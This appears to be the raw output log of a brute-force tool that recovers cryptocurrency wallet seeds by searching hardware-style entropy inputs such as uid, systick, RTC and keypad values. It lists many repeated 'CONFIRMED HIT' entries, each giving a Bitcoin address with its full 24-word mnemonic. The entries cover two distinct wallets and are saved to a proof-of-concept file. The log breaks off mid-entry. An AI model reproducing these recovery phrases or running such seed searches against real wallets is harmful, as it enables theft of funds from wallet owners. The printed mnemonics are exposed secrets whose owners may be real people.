+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b002f
+  systick  = 72095
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0030
+  systick  = 72064
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0031
+  systick  = 72065
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0032
+  systick  = 72066
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0033
+  systick  = 72067
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0034
+  systick  = 72068
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0035
+  systick  = 72069
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0036
+  systick  = 72070
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0037
+  systick  = 72071
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0038
+  systick  = 72072
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+[30.37%] 200.64M/660.56M @ 44.22K/s  ETA 2.89h
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0039
+  systick  = 72073
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b003a
+  systick  = 72074
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b003b
+  systick  = 72075
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b003c
+  systick  = 72076
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b003d
+  systick  = 72077
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b003e
+  systick  = 72078
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b003f
+  systick  = 72079
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0040
+  systick  = 72176
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0041
+  systick  = 72177
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0042
+  systick  = 72178
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0043
+  systick  = 72179
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0044
+  systick  = 72180
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0045
+  systick  = 72181
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0046
+  systick  = 72182
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0047
+  systick  = 72183
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0048
+  systick  = 72184
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+[32.91%] 217.36M/660.56M @ 44.25K/s  ETA 2.78h
+[35.44%] 234.08M/660.56M @ 44.25K/s  ETA 2.68h
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230000
+  systick  = 33328
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230001
+  systick  = 33329
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230002
+  systick  = 33330
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230003
+  systick  = 33331
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230004
+  systick  = 33332
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230005
+  systick  = 33333
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230006
+  systick  = 33334
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230007
+  systick  = 33335
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230008
+  systick  = 33336
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230009
+  systick  = 33337
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023000a
+  systick  = 33338
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023000b
+  systick  = 33339
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023000c
+  systick  = 33340
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023000d
+  systick  = 33341
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023000e
+  systick  = 33342
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023000f
+  systick  = 33343
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230010
+  systick  = 33312
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230011
+  systick  = 33313
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230012
+  systick  = 33314
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230013
+  systick  = 33315
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230014
+  systick  = 33316
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230015
+  systick  = 33317
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230016
+  systick  = 33318
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230017
+  systick  = 33319
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230018
+  systick  = 33320
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230019
+  systick  = 33321
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023001a
+  systick  = 33322
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023001b
+  systick  = 33323
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+[37.97%] 250.80M/660.56M @ 44.26K/s  ETA 2.57h
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023001c
+  systick  = 33324
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023001d
+  systick  = 33325
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023001e
+  systick  = 33326
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023001f
+  systick  = 33327
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230020
+  systick  = 33296
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230021
+  systick  = 33297
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230022
+  systick  = 33298
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230023
+  systick  = 33299
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230024
+  systick  = 33300
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230025
+  systick  = 33301
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230026
+  systick  = 33302
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230027
+  systick  = 33303
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230028
+  systick  = 33304
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x00230029
+  systick  = 33305
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023002a
+  systick  = 33306
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = joy prepare among can fetch around bread diesel loop bless maze action fetch below clown perfect meadow famous know survey cook friend tenant note
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qddkv7rcseufmy54qggqdmeq6qt2tfcxv5rxcp6
+  uid      = 0x0023002b
+  systick  = 33307
